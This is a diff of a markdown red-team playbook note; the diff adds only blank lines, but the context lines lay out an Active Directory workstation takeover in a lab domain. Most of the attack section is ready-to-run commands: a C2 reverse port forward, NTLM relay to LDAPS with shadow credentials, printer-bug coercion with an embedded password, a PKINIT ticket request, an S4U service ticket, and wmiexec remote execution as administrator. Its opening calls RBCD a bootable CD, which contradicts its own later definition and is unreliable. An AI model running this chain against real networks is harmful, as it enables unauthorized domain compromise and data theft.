@@ -39,11 +39,15 @@ Technical Explanation: RBCD is a bootable CD that can be used to start a compute
 
 Business Value: This attack technique can be used to gain unauthorized access to sensitive data, steal intellectual property, or cause damage to a company's reputation.
 
+ 
+
 ## Requirements
 
 1. Access to a target system
 
 1. RBCD
+
+ 
 
 ## Defense
 
@@ -52,6 +56,8 @@ Business Value: This attack technique can be used to gain unauthorized access to
 1. Regularly monitor and audit network activity to detect unauthorized access and suspicious behavior
 
 1. Implement network segmentation to limit lateral movement within the network
+
+ 
 
 ## Objectives
 
@@ -65,6 +71,8 @@ Business Value: This attack technique can be used to gain unauthorized access to
 
 1. Access sensitive data
 
+ 
+
 # Instructions
 
 1. 1. Add Reverse Port Forward from 8081 to Team Server 81.
@@ -74,9 +82,17 @@ Business Value: This attack technique can be used to gain unauthorized access to
 5. Get a ST (service ticket) for the target account.
 6. Utilize the ST for future activity.
 
+ 
+
+
+
 **Code**: [[# Only for C2: Add Reverse Port Forward from 8081 ]]
 
+
+
 > This command is used to execute a scenario where the attacker takes over a workstation using RBCD (Resource-Based Constrained Delegation). The command involves adding a reverse port forward from 8081 to Team Server 81, setting up ntlmrelayx to relay authentication from target workstation to DC, executing a printer bug to trigger authentication from target workstation, getting a TGT using the newly acquired certificate via PKINIT, getting a ST (service ticket) for the target account, and utilizing the ST for future activity.
+
+
 
 **Command** ([[Add Reverse Port Forward from 8081 to Team Server 81]]):
 
@@ -84,11 +100,19 @@ Business Value: This attack technique can be used to gain unauthorized access to
 # Only for C2: Add Reverse Port Forward from 8081 to Team Server 81
 ```
 
+
+
+
+
 **Command** ([[Set up ntlmrelayx to relay authentication from target workstation to DC]]):
 
 ```bash
 proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81
 ```
+
+
+
+
 
 **Command** ([[Execute printer bug to trigger authentication from target workstation]]):
 
@@ -96,11 +120,19 @@ proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --s
 proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file
 ```
 
+
+
+
+
 **Command** ([[Get a TGT using the newly acquired certificate via PKINIT]]):
 
 ```bash
 proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
 ```
+
+
+
+
 
 **Command** ([[Get a ST (service ticket) for the target account]]):
 
@@ -108,12 +140,18 @@ proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impac
 proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
 ```
 
+
+
+
+
 **Command** ([[Utilize the ST for future activity]]):
 
 ```bash
 export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
 proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -139,3 +177,5 @@ proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
 
 - [[Active Directory Attacks]]
 - [[Shadow Credentials]]
+
+
